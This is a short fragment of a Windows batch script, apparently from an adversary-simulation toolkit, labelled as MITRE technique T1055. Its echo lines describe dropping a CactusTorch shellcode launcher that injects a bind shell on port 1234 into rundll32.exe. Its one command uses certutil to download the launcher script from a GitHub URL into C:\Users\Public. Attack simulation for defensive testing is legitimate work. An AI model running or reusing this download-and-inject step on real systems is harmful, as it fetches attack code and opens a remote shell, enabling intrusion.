...
ECHO ===========================================================================
ECHO CACTUSTORCH - T1055
ECHO Using certutil to drop a CactusTorch shellcode launcher injecting bind shell (port 1234/tcp) into rundll32.exe
...
cmd.exe /c certutil.exe -urlcache -split -f https://raw.githubusercontent.com/JacobArchuleta/APTSimulator/master/download/cactus.js C:\Users\Public\en-US.js
